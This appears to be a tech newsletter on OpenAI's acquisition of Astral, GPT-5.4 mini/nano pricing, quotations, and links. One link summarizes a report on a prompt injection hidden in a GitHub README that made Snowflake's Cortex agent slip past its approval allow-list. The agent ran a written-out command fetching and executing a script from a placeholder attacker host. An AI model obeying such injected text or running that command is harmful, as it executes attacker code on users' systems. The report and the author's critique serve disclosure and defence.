@@ -1,0 +1,102 @@
+Thoughts on OpenAI acquiring Astral and uv/ruff
+Plus GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52
+In this newsletter:
+Thoughts on OpenAI acquiring Astral and uv/ruff/ty
+GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52
+Plus 2 links and 3 quotations
+Sponsor message: Ship SSO, SCIM, RBAC, and more with WorkOS, so your engineers focus on building the core product, not rebuilding auth. Trusted by 2,000+ companies including OpenAI, Anthropic, Cursor and Vercel.
+Thoughts on OpenAI acquiring Astral and uv/ruff/ty - 2026-03-19
+The big news on Thursday morning: Astral to join OpenAI (on the Astral blog) and OpenAI to acquire Astral (the OpenAI announcement). Astral are the company behind uv, ruff, and ty - three increasingly load-bearing open source projects in the Python ecosystem. I have thoughts!
+The official line from OpenAI and Astral
+The Astral team will become part of the Codex team at OpenAI.
+Charlie Marsh has this to say:
+Open source is at the heart of that impact and the heart of that story; it sits at the center of everything we do. In line with our philosophy and OpenAI’s own announcement, OpenAI will continue supporting our open source tools after the deal closes. We’ll keep building in the open, alongside our community -- and for the broader Python ecosystem -- just as we have from the start. [...]
+After joining the Codex team, we’ll continue building our open source tools, explore ways they can work more seamlessly with Codex, and expand our reach to think more broadly about the future of software development.
+OpenAI’s message has a slightly different focus (highlights mine):
+As part of our developer-first philosophy, after closing OpenAI plans to support Astral’s open source products. By bringing Astral’s tooling and engineering expertise to OpenAI, we will accelerate our work on Codex and expand what AI can do across the software development lifecycle.
+This is a slightly confusing message. The Codex CLI is a Rust application, and Astral have some of the best Rust engineers in the industry - BurntSushi alone (Rust regex, ripgrep, jiff) may be worth the price of acquisition!
+So is this about the talent or about the product? I expect both, but I know from past experience that a product+talent acquisition can turn into a talent-only acquisition later on.
+uv is the big one
+Of Astral’s projects the most impactful is uv. If you’re not familiar with it, uv
+is by far the most convincing solution to Python’s environment management problems, best illustrated by this classic XKCD:
+Switch from python
+to uv run
+and most of these problems go away. I’ve been using it extensively for the past couple of years and it’s become an essential part of my workflow.
+I’m not alone in this. According to PyPI Stats uv was downloaded more than 126 million times last month! Since its release in February 2024 - just two years ago - it’s become one of the most popular tools for running Python code.
+Ruff and ty
+Astral’s two other big projects are ruff - a Python linter and formatter - and ty - a fast Python type checker.
+These are popular tools that provide a great developer experience but they aren’t load-bearing in the same way that uv
+is.
+They do however resonate well with coding agent tools like Codex - giving an agent access to fast linting and type checking tools can help improve the quality of the code they generate.
+I’m not convinced that integrating them into the coding agent itself as opposed to telling it when to run them will make a meaningful difference, but I may just not be imaginative enough here.
+What of pyx?
+Ever since uv
+started to gain traction the Python community has been worrying about the strategic risk of a single VC-backed company owning a key piece of Python infrastructure. I wrote about one of those conversations in detail back in September 2024.
+The conversation back then focused on what Astral’s business plan could be, which started to take form in August 2025 when they announced pyx, their private PyPI-style package registry for organizations.
+I’m less convinced that pyx makes sense within OpenAI, and it’s notably absent from both the Astral and OpenAI announcement posts.
+Competitive dynamics
+An interesting aspect of this deal is how it might impact the competition between Anthropic and OpenAI.
+Both companies spent most of 2025 focused on improving the coding ability of their models, resulting in the November 2025 inflection point when coding agents went from often-useful to almost-indispensable tools for software development.
+The competition between Anthropic’s Claude Code and OpenAI’s Codex is fierce. Those $200/month subscriptions add up to billions of dollars a year in revenue, for companies that very much need that money.
+Anthropic acquired the Bun JavaScript runtime in December 2025, an acquisition that looks somewhat similar in shape to Astral.
+Bun was already a core component of Claude Code and that acquisition looked to mainly be about ensuring that a crucial dependency stayed actively maintained. Claude Code’s performance has increased significantly since then thanks to the efforts of Bun’s Jarred Sumner.
+One bad version of this deal would be if OpenAI start using their ownership of uv
+as leverage in their competition with Anthropic.
+Astral’s quiet series A and B
+One detail that caught my eye from Astral’s announcement, in the section thanking the team, investors, and community:
+Second, to our investors, especially Casey Aylward from Accel, who led our Seed and Series A, and Jennifer Li from Andreessen Horowitz, who led our Series B. As a first-time, technical, solo founder, you showed far more belief in me than I ever showed in myself, and I will never forget that.
+As far as I can tell neither the Series A nor the Series B were previously announced - I’ve only been able to find coverage of the original seed round from April 2023.
+Those investors presumably now get to exchange their stake in Astral for a piece of OpenAI. I wonder how much influence they had on Astral’s decision to sell.
+Forking as a credible exit?
+Armin Ronacher built Rye, which was later taken over by Astral and effectively merged with uv. In August 2024 he wrote about the risk involved in a VC-backed company owning a key piece of open source infrastructure and said the following (highlight mine):
+However having seen the code and what uv is doing, even in the worst possible future this is a very forkable and maintainable thing. I believe that even in case Astral shuts down or were to do something incredibly dodgy licensing wise, the community would be better off than before uv existed.
+Astral’s own Douglas Creager emphasized this angle on Hacker News today:
+All I can say is that right now, we’re committed to maintaining our open-source tools with the same level of effort, care, and attention to detail as before. That does not change with this acquisition. No one can guarantee how motives, incentives, and decisions might change years down the line. But that’s why we bake optionality into it with the tools being permissively licensed. That makes the worst-case scenarios have the shape of “fork and move on”, and not “software disappears forever”.
+I like and trust the Astral team and I’m optimistic that their projects will be well-maintained in their new home.
+OpenAI don’t yet have much of a track record with respect to acquiring and maintaining open source projects. They’ve been on a bit of an acquisition spree over the past three months though, snapping up Promptfoo and OpenClaw (sort-of, they hired creator Peter Steinberger and are spinning OpenClaw off to a foundation), plus closed source LaTeX platform Crixet (now Prism).
+If things do go south for uv
+and the other Astral projects we’ll get to see how credible the forking exit strategy turns out to be.
+OpenAI on Tuesday: Introducing GPT‑5.4 mini and nano. These models join GPT-5.4 which was released two weeks ago.
+OpenAI’s self-reported benchmarks show the new 5.4-nano out-performing their previous GPT-5 mini model when run at maximum reasoning effort. The new mini is also 2x faster than the previous mini.
+Here’s how the pricing looks - all prices are per million tokens. gpt-5.4-nano
+is notably even cheaper than Google’s Gemini 3.1 Flash-Lite:
+I used GPT-5.4 nano to generate a description of this photo I took at the John M. Mossman Lock Collection:
+llm -m gpt-5.4-nano -a IMG_2324.jpeg 'describe image'
+Here’s the output:
+The image shows the interior of a museum gallery with a long display wall. White-painted brick walls are covered with many framed portraits arranged in neat rows. Below the portraits, there are multiple glass display cases with dark wooden frames and glass tops/fronts, containing various old historical objects and equipment. The room has a polished wooden floor, hanging ceiling light fixtures/cords, and a few visible pipes near the top of the wall. In the foreground, glass cases run along the length of the room, reflecting items from other sections of the gallery.
+That took 2,751 input tokens and 112 output tokens, at a cost of 0.069 cents (less than a tenth of a cent). That means describing every single photo in my 76,000 photo collection would cost around $52.44.
+I released llm 0.29 with support for the new models.
+Then I had OpenAI Codex loop through all five reasoning effort levels and all three models and produce this combined SVG grid of pelicans riding bicycles (generation transcripts here). I do like the gpt-5.4 xhigh one the best, it has a good bicycle (with nice spokes) and the pelican has a fish in its beak!
+Quote 2026-03-17
+If you do not understand the ticket, if you do not understand the solution, or if you do not understand the feedback on your PR, then your use of LLM is hurting Django as a whole. [...]
+For a reviewer, it’s demoralizing to communicate with a facade of a human.
+This is because contributing to open source, especially Django, is a communal endeavor. Removing your humanity from that experience makes that endeavor more difficult. If you use an LLM to contribute to Django, it needs to be as a complementary tool, not as your vehicle.
+Tim Schilling, Give Django your time and money, not your tokens
+Quote 2026-03-17
+Great news—we’ve hit our (very modest) performance goals for the CPython JIT over a year early for macOS AArch64, and a few months early for x86_64 Linux. The 3.15 alpha JIT is about 11-12% faster on macOS AArch64 than the tail calling interpreter, and **5-6%**faster than the standard interpreter on x86_64 Linux.
+Ken Jin, Python 3.15’s JIT is now back on track
+Link 2026-03-18 Snowflake Cortex AI Escapes Sandbox and Executes Malware:
+PromptArmor report on a prompt injection attack chain in Snowflake’s Cortex Agent, now fixed.
+The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.
+The attack caused the agent to execute this code:
+cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
+Cortex listed cat
+commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.
+I’ve seen allow-lists against command patterns like this in a bunch of different agent tools and I don’t trust them at all - they feel inherently unreliable to me.
+I’d rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.
+Link 2026-03-18 Autoresearching Apple’s “LLM in a Flash” to run Qwen 397B locally:
+Here’s a fascinating piece of research by Dan Woods, who managed to get a custom version of Qwen3.5-397B-A17B running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite that model taking up 209GB (120GB quantized) on disk.
+Qwen3.5-397B-A17B is a Mixture-of-Experts (MoE) model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed into memory from SSD, saving them from all needing to be held in RAM at the same time.
+Dan used techniques described in Apple’s 2023 paper LLM in a flash: Efficient Large Language Model Inference with Limited Memory:
+This paper tackles the challenge of efficiently running LLMs that exceed the available DRAM capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.
+He fed the paper to Claude Code and used a variant of Andrej Karpathy’s autoresearch pattern to have Claude run 90 experiments and produce MLX Objective-C and Metal code that ran the model as efficiently as possible.
+danveloper/flash-moe has the resulting code plus a PDF paper mostly written by Claude Opus 4.6 describing the experiment in full.
+The final model has the experts quantized to 2-bit, but the non-expert parts of the model such as the embedding table and routing matrices are kept at their original precision, adding up to 5.5GB which stays resident in memory while the model is running.
+Qwen 3.5 usually runs 10 experts per token, but this setup dropped that to 4 while claiming that the biggest quality drop-off occurred at 3.
+It’s not clear to me how much the quality of the model results are affected. Claude claimed that “Output quality at 2-bit is indistinguishable from 4-bit for these evaluations”, but the description of the evaluations it ran is quite thin.
+Update: Dan’s latest version upgrades to 4-bit quantization of the experts (209GB on disk, 4.36 tokens/second) after finding that the 2-bit version broke tool calling while 4-bit handles that well.
+Quote 2026-03-20
+Congrats to the @cursor_ai team on the launch of Composer 2!
+We are proud to see Kimi-k2.5 provide the foundation. Seeing our model integrated effectively through Cursor’s continued pretraining & high-compute RL training is the open model ecosystem we love to support.
+Note: Cursor accesses Kimi-k2.5 via @FireworksAI_HQ hosted RL and inference platform as part of an authorized commercial partnership.
+Kimi.ai @Kimi_Moonshot, responding to reports that Composer 2 was built on top of Kimi K2.5
